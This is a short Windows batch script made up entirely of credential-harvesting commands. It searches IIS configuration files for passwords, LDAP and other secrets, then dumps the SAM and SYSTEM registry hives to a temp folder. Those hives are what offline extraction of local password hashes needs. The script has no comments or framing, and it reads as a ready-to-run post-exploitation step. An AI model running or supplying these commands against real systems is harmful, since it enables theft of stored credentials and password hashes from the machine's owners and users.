@echo off
findstr /s /i "password ldap secret" C:\inetpub\*.config
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
